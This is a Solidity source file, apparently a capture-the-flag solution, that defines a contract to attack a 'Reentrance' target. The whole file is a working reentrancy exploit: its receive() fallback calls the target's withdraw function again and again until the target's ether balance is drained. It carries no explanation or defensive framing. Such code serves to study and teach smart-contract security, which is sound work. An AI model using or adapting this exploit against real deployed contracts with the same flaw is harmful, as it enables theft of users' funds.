// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./Reentrance.sol";
import "hardhat/console.sol";

contract RentranceAttacker {
  using SafeMath for uint256;
  Reentrance target;

  constructor(address payable _target) public {
    target = Reentrance(_target);
  }

  function attack(uint256 _amount) public payable {
    target.withdraw(_amount);
  }

  receive() external payable {
    if (address(target).balance != 0) target.withdraw(1000000000000000);
  }
}
